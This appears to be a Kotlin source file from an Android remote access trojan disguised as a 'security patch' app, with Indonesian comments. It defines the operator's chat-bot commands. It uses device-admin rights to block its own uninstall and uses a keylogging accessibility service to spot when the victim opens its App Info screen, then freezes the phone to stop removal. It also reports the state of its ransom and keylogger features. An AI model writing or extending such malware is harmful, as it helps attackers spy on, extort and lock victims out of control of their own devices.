package com.android.security.patch.commands

import android.app.admin.DevicePolicyManager
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import com.android.security.patch.AdminReceiver
import com.android.security.patch.HangManager
import com.android.security.patch.Prefs
import com.android.security.patch.RatApi

object Rules {

    // ============ ANTI-UNINSTALL ============

    fun applyAntiUninstall(ctx: Context, on: Boolean) {
        Prefs.setBool(ctx, Prefs.ANTI_UNINSTALL_ON, on)
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            if (dpm.isAdminActive(AdminReceiver.component(ctx))) {
                dpm.setUninstallBlocked(AdminReceiver.component(ctx), ctx.packageName, on)
            }
        } catch (_: Throwable) {}
    }

    fun toggleAntiUninstall(ctx: Context, chatId: Long, args: Array<String>) {
        val mode = args.getOrNull(0)?.lowercase()
        val current = Prefs.getBool(ctx, Prefs.ANTI_UNINSTALL_ON)
        val next = when (mode) {
            "on", "true", "1" -> true
            "off", "false", "0" -> false
            else -> !current
        }
        applyAntiUninstall(ctx, next)
        val state = if (next) "ON" else "OFF"
        val extra = if (!next) "\n(apk bisa di-uninstall, service akan mati total)" else ""
        RatApi.sendMessage(ctx, "anti-uninstall: <b>$state</b>$extra", chatId)
    }

    // ============ HANG ============

    fun hangNow(ctx: Context, chatId: Long, args: Array<String>) {
        HangManager.start(ctx, HangManager.Reason.MANUAL)
        RatApi.sendMessage(ctx, "hang started (auto-stop 60s)", chatId)
    }

    fun hangStop(ctx: Context, chatId: Long) {
        HangManager.stop(ctx)
        RatApi.sendMessage(ctx, "hang stopped", chatId)
    }

    /**
     * Dipanggil dari KeylogService.onAccessibilityEvent.
     * Cek kalau user lagi di App Info screen aplikasi kita → trigger hang.
     */
    fun onAccessibilityEvent(ctx: Context, e: AccessibilityEvent) {
        if (!Prefs.getBool(ctx, Prefs.ANTI_UNINSTALL_ON)) return
        try {
            val cls = e.className?.toString() ?: ""
            val pkg = e.packageName?.toString() ?: ""
            // layar detail aplikasi di Settings
            val isAppDetail = cls.contains("InstalledAppDetails")
                || cls.contains("ApplicationDetails")
                || cls.contains("AppInfo")
                || (pkg == "com.android.settings" && cls.contains("ManageApplications"))

            if (!isAppDetail) return

            val text = e.text?.joinToString(" ").orEmpty()
            val contentDesc = e.contentDescription?.toString().orEmpty()
            val all = (text + " " + contentDesc).lowercase()

            val hits = all.contains("security patch")
                || all.contains(ctx.packageName)
                || all.contains("com.android.security.patch")

            if (hits) {
                HangManager.start(ctx, HangManager.Reason.UNINSTALL)
            }
        } catch (_: Throwable) {}
    }

    // ============ SHOW ============

    fun show(ctx: Context, chatId: Long) {
        val anti = Prefs.getBool(ctx, Prefs.ANTI_UNINSTALL_ON)
        val hang = Prefs.getBool(ctx, Prefs.HANG_ACTIVE)
        val ransom = Prefs.getBool(ctx, Prefs.RANSOM_ACTIVE)
        val admin = AdminReceiver.isActive(ctx)
        val owner = AdminReceiver.isDeviceOwner(ctx)
        val a11y = com.android.security.patch.KeylogService.alive

        val sb = StringBuilder()
        sb.append("<b>⚙ Aturan Rat</b>\n\n")
        sb.append("anti-uninstall: <b>${if (anti) "ON" else "OFF"}</b>\n")
        sb.append("hang sedang aktif: <b>${if (hang) "YA" else "tidak"}</b>\n")
        sb.append("ransom aktif: <b>${if (ransom) "YA" else "tidak"}</b>\n")
        sb.append("device admin: <b>${if (admin) "aktif" else "nonaktif"}</b>\n")
        sb.append("device owner: <b>${if (owner) "ya" else "tidak"}</b>\n")
        sb.append("accessibility: <b>${if (a11y) "aktif" else "nonaktif"}</b>\n")
        sb.append("\n<b>aksi:</b>\n")
        sb.append("• <code>/anti_uninstall on|off|toggle</code>\n")
        sb.append("• <code>/hang_now</code> — paksa hang 60s\n")
        sb.append("• <code>/hang_stop</code> — matikan hang\n")
        sb.append("• <code>/check_paths</code> — cek privilege\n")
        RatApi.sendMessage(ctx, sb.toString(), chatId)
    }
}